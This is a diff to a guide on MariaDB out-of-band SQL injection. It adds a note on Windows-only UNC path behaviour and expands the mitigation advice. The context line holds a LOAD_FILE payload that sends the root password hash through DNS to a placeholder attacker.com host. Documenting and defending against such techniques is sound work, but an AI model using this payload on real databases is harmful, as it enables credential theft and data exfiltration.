@@ -52,6 +52,8 @@ SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM mysql.user WHERE user='roo
 
 This causes MariaDB to resolve a subdomain like `5f4dcc3b5aa765d61d8327deb882cf99.attacker.com`, sending the password hash as part of the DNS request.
 
+> **Platform Dependency:** UNC paths (e.g., `\\attacker.com\share`) leverage Windows SMB/NetBIOS behavior and are **primarily effective on Windows systems**. On Linux/Unix, this technique typically does not work unless Samba/SMB client libraries are installed and properly configured (which is uncommon for database servers). Default Linux MariaDB deployments will simply return NULL for UNC path LOAD_FILE calls without triggering DNS lookups.
+
 ##### DNS Path Construction Examples
 
 ```sql
@@ -278,11 +280,31 @@ SELECT
 
 ### Mitigation
 
-To prevent OOB attacks:
+#### Primary Defenses (Prevent SQL Injection)
 
-1. Restrict outbound connections from the database server
-2. Set `skip-networking` for local-only MariaDB instances
-3. Configure firewalls to block unexpected outbound connections
-4. Disable the FILE privilege
-5. Monitor unusual DNS or network activity from database servers
-6. Use prepared statements to prevent SQL injection
+1. **Use prepared statements and parameterized queries** - The most effective defense against SQL injection, though they don't stop exfiltration if an injection already exists
+2. **Strict input validation** - Validate and sanitize all user inputs at application boundaries
+3. **Least-privilege database accounts** - Applications should connect with minimal required permissions
+
+#### OOB-Specific Controls
+
+**Database-Level:**
+
+- **Disable FILE privilege** - Revoke FILE from application database users to prevent LOAD_FILE and INTO OUTFILE
+- **Set `secure_file_priv`** - Restrict file operations to specific directories or disable entirely (`secure_file_priv = NULL`)
+- **Set `skip-networking`** - For local-only MariaDB instances that don't need network access
+- **Disable LOAD DATA LOCAL** - Set `local_infile = 0` to prevent local file reading
+
+**Network-Level:**
+
+- **DNS filtering and monitoring** - Block or log unusual DNS queries from database servers; use internal DNS resolvers
+- **Egress filtering** - Allowlist only required outbound connections from database servers (typically none)
+- **Block recursive DNS** - Force database servers to use controlled internal DNS resolvers
+- **SMB/NetBIOS blocking** - Block outbound ports 137-139, 445 from database servers
+
+**Detection and Monitoring:**
+
+- **Database Activity Monitoring (DAM)** - Deploy rules to detect OOB query patterns (LOAD_FILE with UNC paths, unusual CONCAT with DNS-like strings)
+- **DNS query logging** - Centralized DNS analytics to detect data exfiltration patterns
+- **Outbound connection alerting** - Alert on any outbound connections from database servers
+- **Rate limiting** - Detect and alert on unusual query patterns or high-frequency requests
